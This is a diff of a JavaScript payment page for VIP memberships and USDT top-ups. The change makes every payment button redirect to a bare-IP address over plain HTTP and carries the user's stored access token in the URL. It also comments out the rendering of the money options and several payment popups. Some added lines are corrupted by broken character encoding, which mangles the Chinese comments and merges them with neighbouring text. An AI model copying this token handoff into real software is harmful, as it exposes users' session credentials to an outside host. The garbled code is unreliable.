@@ -1,7 +1,8 @@
 (()=>{
-    var base = 'http://45.194.18.126:39200'
-    var token = localStorage.getItem('token')
-    var userJson = localStorage.getItem('userInfo')
+    var base = '/api/live'
+    // var base = 'http://45.194.18.126:39200'
+    var token = localStorage.getItem('live_access_token')
+    var userJson = localStorage.getItem('live_user_info')
     	var user = JSON.parse(userJson)
     var cacheTemplate = ''
     var cacheMoneyTemplate = ''
@@ -9,16 +10,20 @@
         getVipList()
         getMoneyList()
         $('#payment').on('click', function() {
-            buyGroup()
+            var tk = localStorage.getItem('live_access_token') || ''
+            window.location.href = 'http://38.181.44.164/me/recharge#token=' + encodeURIComponent(tk)
         })
         $('#payment-yd').on('click', function() {
-            buyGroup_yd()
+            var tk = localStorage.getItem('live_access_token') || ''
+            window.location.href = 'http://38.181.44.164/me/recharge#token=' + encodeURIComponent(tk)
         })
         $('#buyPoint').on('click', function() {
-            checkVip(1)
+            var tk = localStorage.getItem('live_access_token') || ''
+            window.location.href = 'http://38.181.44.164/me/recharge#token=' + encodeURIComponent(tk)
         })
          $('#buyPoint-yd').on('click', function() {
-            checkVip(2)
+            var tk = localStorage.getItem('live_access_token') || ''
+            window.location.href = 'http://38.181.44.164/me/recharge#token=' + encodeURIComponent(tk)
         })
         
         $('.usdt-group').on('click', function() {
@@ -67,10 +72,12 @@
             if(pay_type==1){
                 $("#usdt-layout").css("display","flex")
                  $('input[name="hidtype"]').val(1)
+                 $('input[name="payType"]').val(1)
                
             }else{
                  $("#usdt-layout").css("display","none")
-                  $('input[name="hidtype"]').val(2)
+                  $('input[name="hidtype"]').val(0)
+                  $('input[name="payType"]').val(3)
             }
         })
         
@@ -160,8 +167,7 @@
             $(this).addClass('sub-gradient-active')
         })
         
-        //手机端
-        
+        //手机�?        
                 cacheTemplate = $('#vip-Layout-yd').html();
         $('#vip-Layout-yd').html(cacheTemplate)
         
@@ -197,10 +203,10 @@
         $.each(data, function(index, item) {
             var template = $('#money-template').html();
 
-            var rendered = template.replaceAll("{{textLabel}}", item.text)
-            .replace("{{value}}", item.value);
+            // var rendered = template.replaceAll("{{textLabel}}", item.text)
+            // .replace("{{value}}", item.value);
 
-            $('#money-layout').append(rendered);
+            // $('#money-layout').append(rendered);
         });
         $('.money-group').on('click', function() {
             $('#money-layout').find('.sub-gradient-active').each((i, d) => {
@@ -272,6 +278,9 @@
         var usdt_id =$('.usdt-group.sub-gradient-active').attr('data-text')
         
        var hidtype =$('input[name="hidtype"]').val()
+
+       var pay_type =$('input[name="payType"]').val()
+
         if(!id) {
                 layer.msg('Please select your membership type')
                 return
@@ -295,6 +304,7 @@
         form.append("id", $('#vip-Layout .sub-gradient-active').data('id'));
         form.append("usdt_id",usdt_id);
         form.append("hidtype",hidtype);
+        form.append("pay_type",pay_type);
         const settings = {
             "async": true,
             "crossDomain": true,
@@ -314,10 +324,10 @@
             if(res.code === 1) {
                 layer.msg(res.msg)
                  getUserInfo();
-                if(res.data.payment_url!==""){
-                     setTimeout(() => {
-                    window.open('http://154.19.70.25:39106/payment.html?pay='+res.data.payment_url, '_blank');
-                    }, 800);
+                 if(res.data.url!=""){
+                  setTimeout(() => {
+                 //  location.href = res.data.url
+                 }, 800);
                 }else{
                     setTimeout(() => {
                     location.reload()
@@ -328,20 +338,17 @@
                 // layer.open({
                 //     type: 1
                     
-                //     ,title: "Payment Address" //不显示标题
-                //      ,area: ['420px', '']
+                //     ,title: "Payment Address" //不显示标�?                //      ,area: ['420px', '']
                 //     ,offset: "auto" //具体配置参考：https://www.layui1.com/doc/modules/layer.html#offset
                 //     ,id: 'layerDemo' //防止重复弹出
                 //     ,content: '<div style="padding: 8px 130px;"><img src="https://api.qrserver.com/v1/create-qr-code/?data='+res.data.payment_url+'" width="150px">'+""+'</div><p style="text-align:center;font-size:28px;">$ '+res.data.money+'</p><p style="text-align:center;font-size:12px;" id="usdt_url">'+res.data.payment_url+'</p><div style="padding: 3px 180px;"><div id="copybutton" class="px-4 py-2 bg-neutral-700 rounded-[10px] md:flex block w-fit mt-5 md:mt-0"><div class="text-white text-sm font-semibold" id="copyhtmlbutton">copy</div></div></div><p style="margin-top:10px;margin-bottom:30px;color:#FC768A;text-align:center;">Please pay the same amount as the order, otherwise the money will not be credited to your account</>'
                 //     // ,btn: 'close'
                 //     ,btnAlign: 'c' //按钮居中
-                //     ,shade: 0 //不显示遮罩
-                //     ,yes: function(){
+                //     ,shade: 0 //不显示遮�?                //     ,yes: function(){
                 //       layer.closeAll();
                 //     }
                 //     ,success: function(){
-                //             // 获取按钮，绑定点击事件
-                //             document.getElementById('copybutton').onclick = function(){
+                //             // 获取按钮，绑定点击事�?                //             document.getElementById('copybutton').onclick = function(){
                 //                 copy()
                 //             };
                 //         }
@@ -364,6 +371,8 @@
         var usdt_id =$('.usdt-group-yd.sub-gradient-active').attr('data-text')
         
        var hidtype =$('input[name="hidtype-yd"]').val()
+
+       var pay_type =$('input[name="pay_type-yd"]').val()
         if(!id) {
                 layer.msg('Please select your membership type')
                 return
@@ -387,6 +396,7 @@
         form.append("id", $('#vip-Layout-yd .sub-gradient-active').data('id'));
         form.append("usdt_id",usdt_id);
         form.append("hidtype",hidtype);
+        form.append("pay_type",pay_type);
         const settings = {
             "async": true,
             "crossDomain": true,
@@ -408,7 +418,7 @@
               
                  if(res.data.payment_url!==""){
                      setTimeout(() => {
-                    window.open('http://154.19.70.25:39106/payment.html?pay='+res.data.payment_url, '_blank');
+                    // window.open('/payment.html?pay='+res.data.payment_url, '_blank');
                     }, 800);
                 }else{
                       layer.msg(res.msg)
@@ -534,7 +544,7 @@
                 }
                 var res = response
                 if(res.code === 1) {
-                    window.open('http://154.19.70.25:39106/payment.html?pay='+res.data.payment_url+"&t=b", '_blank');
+                    // window.open('/payment.html?pay='+res.data.payment_url+"&t=b", '_blank');
     
                 } else {
                    layer.msg(res.msg)
@@ -583,7 +593,7 @@
             if(res.code === 1) {
                  if(res.data.payment_url!==""){
                      setTimeout(() => {
-                     window.open('http://154.19.70.25:39106/payment.html?pay='+res.data.payment_url+"&t=b", '_blank');
+                     window.open('/payment.html?pay='+res.data.payment_url+"&t=b", '_blank');
                     }, 800);
                 }else{
                     layer.msg(res.msg)
